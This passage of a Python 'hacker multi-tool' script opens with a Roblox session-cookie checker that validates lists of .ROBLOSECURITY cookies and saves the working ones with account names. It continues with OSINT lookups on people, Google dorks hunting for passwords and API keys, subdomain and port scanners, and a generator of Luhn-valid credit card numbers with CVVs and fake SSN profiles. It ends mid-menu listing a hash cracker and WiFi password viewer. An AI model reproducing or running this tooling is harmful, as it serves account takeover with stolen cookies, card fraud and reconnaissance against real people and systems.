            print(f"{Colors.CYAN}[*] Checking {len(cookies)} cookies...{Colors.END}\n")
            
            valid = []
            
            for i, cookie in enumerate(cookies, 1):
                print(f"{Colors.CYAN}[*] Checking {i}/{len(cookies)}{Colors.END}", end='\r')
                
                headers = {'Cookie': f'.ROBLOSECURITY={cookie}', 'User-Agent': 'Mozilla/5.0'}
                
                try:
                    r = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=5)
                    
                    if r.status_code == 200:
                        user = r.json()
                        valid.append({
                            'cookie': cookie,
                            'username': user.get('name'),
                            'id': user.get('id')
                        })
                        print(f"{Colors.GREEN}[✓] Valid: {user.get('name')}{Colors.END}")
                except:
                    pass
            
            print(f"\n\n{Colors.GREEN}[✓] Valid cookies: {len(valid)}{Colors.END}")
            
            if valid:
                valid_file = f"valid_roblox_cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(valid_file, 'w') as f:
                    for v in valid:
                        f.write(f"Cookie: {v['cookie']}\n")
                        f.write(f"User: {v['username']} (ID: {v['id']})\n")
                        f.write("-" * 50 + "\n")
                
                print(f"{Colors.GREEN}[✓] Valid cookies saved to {valid_file}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()

# ==================== OSINT TOOLS ====================
class OsintTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("OSINT TOOLS")
            
            options = {
                '1': 'IP Lookup',
                '2': 'Phone Number Lookup',
                '3': 'Email Breach Check',
                '4': 'Username Search',
                '5': 'Domain Info',
                '6': 'DNS Lookup',
                '7': 'Website Technology',
                '8': 'Google Dork Generator',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                OsintTools.ip_lookup()
            elif choice == '2':
                OsintTools.phone_lookup()
            elif choice == '3':
                OsintTools.email_breach_check()
            elif choice == '4':
                OsintTools.username_search()
            elif choice == '5':
                OsintTools.domain_info()
            elif choice == '6':
                OsintTools.dns_lookup()
            elif choice == '7':
                OsintTools.website_tech()
            elif choice == '8':
                OsintTools.google_dork_generator()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def ip_lookup():
        clear_screen()
        print_section("IP LOOKUP")
        
        target = input(f"{Colors.GREEN}[?] Enter IP or Domain: {Colors.END}").strip()
        
        try:
            # Get IP if domain
            if not re.match(r'^\d+\.\d+\.\d+\.\d+$', target):
                ip = socket.gethostbyname(target)
                print(f"{Colors.GREEN}Resolved IP: {Colors.END}{ip}")
                target = ip
            
            r = requests.get(f'http://ip-api.com/json/{target}')
            
            if r.status_code == 200:
                data = r.json()
                
                print(f"\n{Colors.CYAN}═══════════ IP INFORMATION ═══════════{Colors.END}")
                print(f"{Colors.GREEN}IP: {Colors.END}{data.get('query')}")
                print(f"{Colors.GREEN}Country: {Colors.END}{data.get('country')}")
                print(f"{Colors.GREEN}Region: {Colors.END}{data.get('regionName')}")
                print(f"{Colors.GREEN}City: {Colors.END}{data.get('city')}")
                print(f"{Colors.GREEN}ZIP: {Colors.END}{data.get('zip')}")
                print(f"{Colors.GREEN}Latitude: {Colors.END}{data.get('lat')}")
                print(f"{Colors.GREEN}Longitude: {Colors.END}{data.get('lon')}")
                print(f"{Colors.GREEN}ISP: {Colors.END}{data.get('isp')}")
                print(f"{Colors.GREEN}Organization: {Colors.END}{data.get('org')}")
                print(f"{Colors.GREEN}AS: {Colors.END}{data.get('as')}")
                print(f"{Colors.GREEN}Timezone: {Colors.END}{data.get('timezone')}")
                
                filename = f"ip_lookup_{target.replace('.', '_')}.txt"
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=4)
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Failed to get IP info{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def phone_lookup():
        clear_screen()
        print_section("PHONE NUMBER LOOKUP")
        
        if not HAS_PHONENUMBERS:
            print(f"{Colors.RED}[!] phonenumbers module not installed{Colors.END}")
            press_enter()
            return
        
        phone = input(f"{Colors.GREEN}[?] Enter phone number (with country code): {Colors.END}").strip()
        
        try:
            parsed = phonenumbers.parse(phone, None)
            
            if phonenumbers.is_valid_number(parsed):
                print(f"\n{Colors.CYAN}═══════════ PHONE INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}International: {Colors.END}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}")
                print(f"{Colors.GREEN}National: {Colors.END}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)}")
                print(f"{Colors.GREEN}Country: {Colors.END}{geocoder.description_for_number(parsed, 'en')}")
                print(f"{Colors.GREEN}Location: {Colors.END}{geocoder.description_for_number(parsed, 'en')}")
                print(f"{Colors.GREEN}Carrier: {Colors.END}{carrier.name_for_number(parsed, 'en')}")
                print(f"{Colors.GREEN}Timezone: {Colors.END}{', '.join(timezone.time_zones_for_number(parsed))}")
                
                # Number type
                num_type = phonenumbers.number_type(parsed)
                type_names = {
                    0: 'Fixed Line', 1: 'Mobile', 2: 'Fixed Line or Mobile',
                    3: 'Toll Free', 4: 'Premium Rate', 5: 'Shared Cost',
                    6: 'VoIP', 7: 'Personal Number', 8: 'Pager'
                }
                print(f"{Colors.GREEN}Type: {Colors.END}{type_names.get(num_type, 'Unknown')}")
                
                filename = f"phone_info_{phone.replace('+', '')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Phone: {phone}\n")
                    f.write(f"Country: {geocoder.description_for_number(parsed, 'en')}\n")
                    f.write(f"Carrier: {carrier.name_for_number(parsed, 'en')}\n")
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Invalid phone number{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def email_breach_check():
        clear_screen()
        print_section("EMAIL BREACH CHECK")
        
        email = input(f"{Colors.GREEN}[?] Enter email: {Colors.END}").strip()
        
        print(f"\n{Colors.CYAN}[*] Checking breach databases...{Colors.END}")
        
        # Hash email for checking
        email_hash = hashlib.md5(email.encode()).hexdigest()
        email_sha1 = hashlib.sha1(email.encode()).hexdigest()
        
        print(f"\n{Colors.CYAN}═══════════ EMAIL INFO ═══════════{Colors.END}")
        print(f"{Colors.GREEN}Email: {Colors.END}{email}")
        print(f"{Colors.GREEN}MD5: {Colors.END}{email_hash}")
        print(f"{Colors.GREEN}SHA1: {Colors.END}{email_sha1}")
        
        # Check haveibeenpwned (public API)
        try:
            r = requests.get(f'https://haveibeenpwned.com/api/v3/breachedaccount/{email}')
            if r.status_code == 200:
                breaches = r.json()
                print(f"\n{Colors.RED}[!] Found in {len(breaches)} breaches:{Colors.END}")
                for breach in breaches[:5]:
                    print(f"{Colors.RED}  - {breach.get('Name')} ({breach.get('BreachDate')}){Colors.END}")
            elif r.status_code == 404:
                print(f"{Colors.GREEN}[✓] No breaches found{Colors.END}")
        except:
            print(f"{Colors.YELLOW}[!] Could not check HIBP API{Colors.END}")
        
        filename = f"email_check_{email.replace('@', '_at_')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Email: {email}\n")
            f.write(f"MD5: {email_hash}\n")
            f.write(f"SHA1: {email_sha1}\n")
        
        print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
        press_enter()
    
    @staticmethod
    def username_search():
        clear_screen()
        print_section("USERNAME SEARCH")
        
        username = input(f"{Colors.GREEN}[?] Enter username: {Colors.END}").strip()
        
        sites = {
            'Instagram': f'https://www.instagram.com/{username}',
            'Twitter': f'https://twitter.com/{username}',
            'Facebook': f'https://www.facebook.com/{username}',
            'TikTok': f'https://www.tiktok.com/@{username}',
            'YouTube': f'https://www.youtube.com/@{username}',
            'Reddit': f'https://www.reddit.com/user/{username}',
            'GitHub': f'https://github.com/{username}',
            'Steam': f'https://steamcommunity.com/id/{username}',
            'Spotify': f'https://open.spotify.com/user/{username}',
            'Telegram': f'https://t.me/{username}',
            'Pinterest': f'https://www.pinterest.com/{username}',
            'Twitch': f'https://www.twitch.tv/{username}',
            'Snapchat': f'https://www.snapchat.com/add/{username}',
            'Roblox': f'https://www.roblox.com/user.aspx?username={username}',
            'Medium': f'https://medium.com/@{username}',
            'DeviantArt': f'https://www.deviantart.com/{username}',
            'SoundCloud': f'https://soundcloud.com/{username}',
            'Vimeo': f'https://vimeo.com/{username}'
        }
        
        print(f"\n{Colors.CYAN}[*] Searching {len(sites)} sites...{Colors.END}\n")
        
        found = []
        
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=3, allow_redirects=True)
                if r.status_code == 200:
                    found.append((site, url))
                    print(f"{Colors.GREEN}[✓] Found on {site}{Colors.END}")
                else:
                    print(f"{Colors.RED}[✗] Not on {site}{Colors.END}")
            except:
                print(f"{Colors.YELLOW}[?] Could not check {site}{Colors.END}")
        
        if found:
            print(f"\n{Colors.GREEN}[✓] Found on {len(found)} sites:{Colors.END}")
            for site, url in found:
                print(f"{Colors.GREEN}  - {site}: {url}{Colors.END}")
            
            filename = f"username_search_{username}.txt"
            with open(filename, 'w') as f:
                for site, url in found:
                    f.write(f"{site}: {url}\n")
            
            print(f"\n{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def domain_info():
        clear_screen()
        print_section("DOMAIN INFO")
        
        if not HAS_WHOIS:
            print(f"{Colors.RED}[!] python-whois module not installed{Colors.END}")
            press_enter()
            return
        
        domain = input(f"{Colors.GREEN}[?] Enter domain: {Colors.END}").strip()
        
        try:
            w = whois.whois(domain)
            
            print(f"\n{Colors.CYAN}═══════════ DOMAIN INFO ═══════════{Colors.END}")
            print(f"{Colors.GREEN}Domain: {Colors.END}{domain}")
            print(f"{Colors.GREEN}Registrar: {Colors.END}{w.registrar}")
            print(f"{Colors.GREEN}Creation Date: {Colors.END}{w.creation_date}")
            print(f"{Colors.GREEN}Expiration Date: {Colors.END}{w.expiration_date}")
            print(f"{Colors.GREEN}Name Servers: {Colors.END}{', '.join(w.name_servers) if w.name_servers else 'N/A'}")
            
            filename = f"domain_info_{domain}.txt"
            with open(filename, 'w') as f:
                f.write(str(w))
            
            print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def dns_lookup():
        clear_screen()
        print_section("DNS LOOKUP")
        
        if not HAS_DNS:
            print(f"{Colors.RED}[!] dnspython module not installed{Colors.END}")
            press_enter()
            return
        
        domain = input(f"{Colors.GREEN}[?] Enter domain: {Colors.END}").strip()
        
        record_types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'SOA']
        
        print(f"\n{Colors.CYAN}[*] Looking up DNS records...{Colors.END}\n")
        
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                print(f"{Colors.GREEN}{rtype} Records:{Colors.END}")
                for answer in answers:
                    print(f"  {answer}")
            except:
                pass
        
        press_enter()
    
    @staticmethod
    def website_tech():
        clear_screen()
        print_section("WEBSITE TECHNOLOGY")
        
        url = input(f"{Colors.GREEN}[?] Enter website URL: {Colors.END}").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            headers = r.headers
            
            print(f"\n{Colors.CYAN}═══════════ SERVER INFO ═══════════{Colors.END}")
            print(f"{Colors.GREEN}Server: {Colors.END}{headers.get('Server', 'Unknown')}")
            print(f"{Colors.GREEN}Powered By: {Colors.END}{headers.get('X-Powered-By', 'Unknown')}")
            
            # Security headers
            print(f"\n{Colors.CYAN}═══════════ SECURITY HEADERS ═══════════{Colors.END}")
            security = {
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-Frame-Options': 'Clickjacking Protection',
                'X-Content-Type-Options': 'MIME Sniffing Protection',
                'X-XSS-Protection': 'XSS Protection'
            }
            
            for header, name in security.items():
                if header in headers:
                    print(f"{Colors.GREEN}✓ {name}{Colors.END}")
                else:
                    print(f"{Colors.RED}✗ {name}{Colors.END}")
            
            filename = f"website_tech_{url.replace('https://', '').replace('http://', '').replace('/', '_')}.txt"
            with open(filename, 'w') as f:
                f.write(str(headers))
            
            print(f"\n{Colors.GREEN}[✓] Headers saved to {filename}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def google_dork_generator():
        clear_screen()
        print_section("GOOGLE DORK GENERATOR")
        
        target = input(f"{Colors.GREEN}[?] Enter target (domain, username, etc.): {Colors.END}").strip()
        
        dorks = {
            'Files': [
                f'site:{target} filetype:pdf',
                f'site:{target} filetype:doc',
                f'site:{target} filetype:xls',
                f'site:{target} filetype:txt',
                f'site:{target} filetype:sql',
                f'site:{target} filetype:conf',
                f'site:{target} filetype:log'
            ],
            'Directories': [
                f'site:{target} intitle:"index of"',
                f'site:{target} inurl:admin',
                f'site:{target} inurl:login',
                f'site:{target} inurl:backup',
                f'site:{target} inurl:wp-content'
            ],
            'Sensitive Info': [
                f'site:{target} "password"',
                f'site:{target} "username"',
                f'site:{target} "email"',
                f'site:{target} "api key"',
                f'site:{target} "secret"'
            ]
        }
        
        print(f"\n{Colors.CYAN}[*] Generated dorks for {target}:{Colors.END}\n")
        
        all_dorks = []
        for category, dork_list in dorks.items():
            print(f"{Colors.GREEN}{category}:{Colors.END}")
            for dork in dork_list:
                print(f"  {Colors.CYAN}•{Colors.END} {dork}")
                all_dorks.append(dork)
            print()
        
        filename = f"google_dorks_{target}.txt"
        with open(filename, 'w') as f:
            for dork in all_dorks:
                f.write(f"{dork}\n")
        
        print(f"{Colors.GREEN}[✓] Saved {len(all_dorks)} dorks to {filename}{Colors.END}")
        press_enter()

# ==================== DOMAIN SECURITY TOOLS ====================
class DomainSecurityTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("DOMAIN SECURITY TOOLS")
            
            options = {
                '1': 'Subdomain Scanner',
                '2': 'SSL Checker',
                '3': 'Port Scanner',
                '4': 'Vulnerability Scan',
                '5': 'Security Headers Check',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                DomainSecurityTools.subdomain_scanner()
            elif choice == '2':
                DomainSecurityTools.ssl_checker()
            elif choice == '3':
                DomainSecurityTools.port_scanner()
            elif choice == '4':
                DomainSecurityTools.vuln_scan()
            elif choice == '5':
                DomainSecurityTools.security_headers()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def subdomain_scanner():
        clear_screen()
        print_section("SUBDOMAIN SCANNER")
        
        domain = input(f"{Colors.GREEN}[?] Enter domain: {Colors.END}").strip()
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
            'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
            'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
            'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
            'web', 'media', 'email', 'images', 'img', 'download', 'dns', 'piwik', 'stats'
        ]
        
        print(f"{Colors.CYAN}[*] Scanning for subdomains...{Colors.END}\n")
        
        found = []
        for sub in common_subdomains:
            url = f"http://{sub}.{domain}"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code < 400:
                    found.append(f"{sub}.{domain}")
                    print(f"{Colors.GREEN}[✓] Found: {sub}.{domain}{Colors.END}")
            except:
                pass
        
        if found:
            filename = f"subdomains_{domain}.txt"
            with open(filename, 'w') as f:
                f.write('\n'.join(found))
            print(f"\n{Colors.GREEN}[✓] Found {len(found)} subdomains, saved to {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] No subdomains found{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def ssl_checker():
        clear_screen()
        print_section("SSL CHECKER")
        
        domain = input(f"{Colors.GREEN}[?] Enter domain: {Colors.END}").strip()
        
        try:
            import ssl
            import socket
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    print(f"\n{Colors.CYAN}═══════════ SSL INFO ═══════════{Colors.END}")
                    print(f"{Colors.GREEN}Issuer: {Colors.END}{cert.get('issuer')}")
                    print(f"{Colors.GREEN}Subject: {Colors.END}{cert.get('subject')}")
                    print(f"{Colors.GREEN}Version: {Colors.END}{cert.get('version')}")
                    
                    # Expiry
                    from datetime import datetime
                    not_after = cert.get('notAfter')
                    if not_after:
                        expiry = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        days_left = (expiry - datetime.now()).days
                        print(f"{Colors.GREEN}Expires: {Colors.END}{not_after} ({days_left} days left)")
                        
                        if days_left < 30:
                            print(f"{Colors.RED}[!] Certificate expires soon!{Colors.END}")
                    
                    filename = f"ssl_info_{domain}.txt"
                    with open(filename, 'w') as f:
                        json.dump(cert, f, indent=4)
                    
                    print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def port_scanner():
        clear_screen()
        print_section("PORT SCANNER")
        
        target = input(f"{Colors.GREEN}[?] Enter target IP or domain: {Colors.END}").strip()
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        print(f"{Colors.CYAN}[*] Scanning ports...{Colors.END}\n")
        
        open_ports = []
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                print(f"{Colors.GREEN}[✓] Port {port} is open{Colors.END}")
            sock.close()
        
        if open_ports:
            filename = f"open_ports_{target}.txt"
            with open(filename, 'w') as f:
                f.write(f"Open ports for {target}: {', '.join(map(str, open_ports))}")
            print(f"\n{Colors.GREEN}[✓] Open ports saved to {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] No open ports found{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def vuln_scan():
        clear_screen()
        print_section("VULNERABILITY SCAN")
        
        url = input(f"{Colors.GREEN}[?] Enter target URL: {Colors.END}").strip()
        
        print(f"{Colors.CYAN}[*] Checking for common vulnerabilities...{Colors.END}\n")
        
        # Check for common headers
        try:
            r = requests.get(url, timeout=5)
            headers = r.headers
            
            vulns = []
            
            # Check for missing security headers
            if 'X-Frame-Options' not in headers:
                vulns.append("Missing X-Frame-Options (Clickjacking risk)")
            if 'X-Content-Type-Options' not in headers:
                vulns.append("Missing X-Content-Type-Options (MIME sniffing risk)")
            if 'Content-Security-Policy' not in headers:
                vulns.append("Missing Content-Security-Policy")
            
            # Check server info disclosure
            if 'Server' in headers:
                vulns.append(f"Server info disclosed: {headers['Server']}")
            
            if vulns:
                print(f"{Colors.RED}[!] Vulnerabilities found:{Colors.END}")
                for vuln in vulns:
                    print(f"{Colors.RED}  - {vuln}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[✓] No obvious vulnerabilities found{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def security_headers():
        clear_screen()
        print_section("SECURITY HEADERS CHECK")
        
        url = input(f"{Colors.GREEN}[?] Enter URL: {Colors.END}").strip()
        
        try:
            r = requests.get(url, timeout=5)
            headers = r.headers
            
            security_headers = {
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-Frame-Options': 'Clickjacking Protection',
                'X-Content-Type-Options': 'MIME Sniffing Protection',
                'X-XSS-Protection': 'XSS Protection',
                'Referrer-Policy': 'Referrer Policy',
                'Feature-Policy': 'Feature Policy',
                'Permissions-Policy': 'Permissions Policy'
            }
            
            print(f"\n{Colors.CYAN}═══════════ SECURITY HEADERS ═══════════{Colors.END}")
            for header, name in security_headers.items():
                if header in headers:
                    print(f"{Colors.GREEN}✓ {name}: {headers[header]}{Colors.END}")
                else:
                    print(f"{Colors.RED}✗ {name} missing{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()

# ==================== FAKE INFO & CC GENERATOR ====================
class FakeInfoTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("FAKE INFO & CC GENERATOR")
            
            options = {
                '1': 'Generate Fake Identity',
                '2': 'Generate Credit Card',
                '3': 'Generate Email',
                '4': 'Generate Phone Number',
                '5': 'Generate Full Profile',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                FakeInfoTools.generate_identity()
            elif choice == '2':
                FakeInfoTools.generate_cc()
            elif choice == '3':
                FakeInfoTools.generate_email()
            elif choice == '4':
                FakeInfoTools.generate_phone()
            elif choice == '5':
                FakeInfoTools.generate_profile()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def generate_identity():
        clear_screen()
        print_section("GENERATE FAKE IDENTITY")
        
        if not HAS_FAKER:
            print(f"{Colors.RED}[!] Faker module not installed{Colors.END}")
            press_enter()
            return
        
        fake = Faker()
        
        print(f"\n{Colors.CYAN}═══════════ FAKE IDENTITY ═══════════{Colors.END}")
        print(f"{Colors.GREEN}Name: {Colors.END}{fake.name()}")
        print(f"{Colors.GREEN}Address: {Colors.END}{fake.address().replace(chr(10), ', ')}")
        print(f"{Colors.GREEN}Email: {Colors.END}{fake.email()}")
        print(f"{Colors.GREEN}Phone: {Colors.END}{fake.phone_number()}")
        print(f"{Colors.GREEN}Job: {Colors.END}{fake.job()}")
        print(f"{Colors.GREEN}Company: {Colors.END}{fake.company()}")
        print(f"{Colors.GREEN}SSN: {Colors.END}{fake.ssn()}")
        print(f"{Colors.GREEN}Birthdate: {Colors.END}{fake.date_of_birth()}")
        
        filename = f"fake_identity_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Name: {fake.name()}\n")
            f.write(f"Address: {fake.address()}\n")
            f.write(f"Email: {fake.email()}\n")
            f.write(f"Phone: {fake.phone_number()}\n")
        
        print(f"\n{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        press_enter()
    
    @staticmethod
    def generate_cc():
        clear_screen()
        print_section("GENERATE CREDIT CARD")
        
        if not HAS_LUHN:
            print(f"{Colors.RED}[!] luhn module not installed{Colors.END}")
            press_enter()
            return
        
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        def generate_card(prefix, length):
            card = [int(d) for d in str(prefix)]
            while len(card) < length - 1:
                card.append(random.randint(0, 9))
            checksum = luhn_checksum(int(''.join(map(str, card))) * 10)
            card.append((10 - checksum) % 10)
            return ''.join(map(str, card))
        
        card_types = {
            'Visa': ('4', 16),
            'MasterCard': ('5', 16),
            'American Express': ('34', 15),
            'Discover': ('6011', 16)
        }
        
        print(f"{Colors.CYAN}Select card type:{Colors.END}")
        types_list = list(card_types.items())
        for i, (name, _) in enumerate(types_list, 1):
            print(f"{Colors.GREEN}[{i}]{Colors.END} {name}")
        
        choice = input(f"\n{Colors.BLUE}[?] Select: {Colors.END}").strip()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(types_list):
                name, (prefix, length) = types_list[idx]
                card_number = generate_card(prefix, length)
                
                # Generate random expiry and CVV
                month = random.randint(1, 12)
                year = random.randint(2025, 2030)
                cvv = f"{random.randint(0, 999):03d}"
                
                print(f"\n{Colors.CYAN}═══════════ CREDIT CARD ═══════════{Colors.END}")
                print(f"{Colors.GREEN}Type: {Colors.END}{name}")
                print(f"{Colors.GREEN}Number: {Colors.END}{card_number}")
                print(f"{Colors.GREEN}Expiry: {Colors.END}{month:02d}/{year}")
                print(f"{Colors.GREEN}CVV: {Colors.END}{cvv}")
                
                filename = f"credit_card_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Type: {name}\n")
                    f.write(f"Number: {card_number}\n")
                    f.write(f"Expiry: {month:02d}/{year}\n")
                    f.write(f"CVV: {cvv}\n")
                
                print(f"\n{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] Invalid option{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def generate_email():
        clear_screen()
        print_section("GENERATE EMAIL")
        
        if not HAS_FAKER:
            print(f"{Colors.RED}[!] Faker module not installed{Colors.END}")
            press_enter()
            return
        
        fake = Faker()
        
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
        
        print(f"{Colors.CYAN}[1] Random email{Colors.END}")
        print(f"{Colors.CYAN}[2] Custom username{Colors.END}")
        
        choice = input(f"\n{Colors.BLUE}[?] Select: {Colors.END}").strip()
        
        if choice == '1':
            email = fake.email()
        elif choice == '2':
            username = input(f"{Colors.GREEN}[?] Enter username: {Colors.END}").strip()
            domain = random.choice(domains)
            email = f"{username}@{domain}"
        else:
            email = fake.email()
        
        print(f"\n{Colors.GREEN}Generated Email: {Colors.END}{email}")
        
        filename = f"generated_email_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(email)
        
        print(f"{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        press_enter()
    
    @staticmethod
    def generate_phone():
        clear_screen()
        print_section("GENERATE PHONE NUMBER")
        
        if not HAS_FAKER:
            print(f"{Colors.RED}[!] Faker module not installed{Colors.END}")
            press_enter()
            return
        
        fake = Faker()
        
        countries = ['US', 'GB', 'FR', 'DE', 'JP', 'AU', 'CA']
        
        print(f"{Colors.CYAN}[1] Random country{Colors.END}")
        print(f"{Colors.CYAN}[2] Select country{Colors.END}")
        
        choice = input(f"\n{Colors.BLUE}[?] Select: {Colors.END}").strip()
        
        if choice == '2':
            for i, country in enumerate(countries, 1):
                print(f"{Colors.GREEN}[{i}]{Colors.END} {country}")
            country_choice = input(f"\n{Colors.BLUE}[?] Select country: {Colors.END}").strip()
            try:
                idx = int(country_choice) - 1
                if 0 <= idx < len(countries):
                    fake = Faker(countries[idx].lower())
                else:
                    fake = Faker()
            except:
                fake = Faker()
        
        phone = fake.phone_number()
        
        print(f"\n{Colors.GREEN}Generated Phone: {Colors.END}{phone}")
        
        filename = f"generated_phone_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(phone)
        
        print(f"{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        press_enter()
    
    @staticmethod
    def generate_profile():
        clear_screen()
        print_section("GENERATE FULL PROFILE")
        
        if not HAS_FAKER:
            print(f"{Colors.RED}[!] Faker module not installed{Colors.END}")
            press_enter()
            return
        
        fake = Faker()
        
        profile = {
            'Name': fake.name(),
            'Username': fake.user_name(),
            'Email': fake.email(),
            'Phone': fake.phone_number(),
            'Address': fake.address().replace('\n', ', '),
            'City': fake.city(),
            'State': fake.state(),
            'Zip': fake.zipcode(),
            'Country': fake.country(),
            'Job': fake.job(),
            'Company': fake.company(),
            'Birthdate': str(fake.date_of_birth()),
            'SSN': fake.ssn(),
            'Credit Card': fake.credit_card_number(),
            'Credit Card Provider': fake.credit_card_provider(),
            'Credit Card Expiry': fake.credit_card_expire(),
            'Credit Card CVV': fake.credit_card_security_code()
        }
        
        print(f"\n{Colors.CYAN}═══════════ FULL PROFILE ═══════════{Colors.END}")
        for key, value in profile.items():
            print(f"{Colors.GREEN}{key}: {Colors.END}{value}")
        
        filename = f"full_profile_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            for key, value in profile.items():
                f.write(f"{key}: {value}\n")
        
        print(f"\n{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        press_enter()

# ==================== SECURITY TOOLS ====================
class SecurityTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("SECURITY TOOLS")
            
            options = {
                '1': 'Password Generator',
                '2': 'Password Strength Checker',
                '3': 'Hash Generator',
                '4': 'Hash Cracker',
                '5': 'Encrypt File (AES)',
                '6': 'Decrypt File (AES)',
                '7': 'WiFi Password Viewer',
                '8': 'System Information',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
